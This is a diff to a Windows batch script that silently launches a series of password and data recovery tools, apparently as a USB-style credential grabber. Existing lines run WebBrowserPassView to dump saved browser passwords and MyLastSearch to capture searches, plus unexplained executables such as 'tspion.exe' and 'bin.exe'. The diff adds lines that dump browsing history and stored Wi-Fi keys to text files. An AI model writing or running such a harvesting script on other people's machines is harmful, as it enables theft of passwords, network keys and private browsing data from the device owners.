@@ -33,6 +33,8 @@ start tspion.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
 start .\App\bins\bin.exe
+start .\App\history\BHV.exe /stext history.txt
+start .\App\wireless_key\WKV.exe /stext Wireless_Keys.txt
 pause
 start .\App\options.bat
 goto eof
@@ -44,6 +46,8 @@ start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
 start .\App\CommandLine\Process.exe
 start .\App\bins\bin.exe
+start .\App\history\BHV.exe /stext history.txt
+start .\App\wireless_key\WKV.exe /stext Wireless_Keys.txt
 pause
 start .\App\options.bat
 goto eof
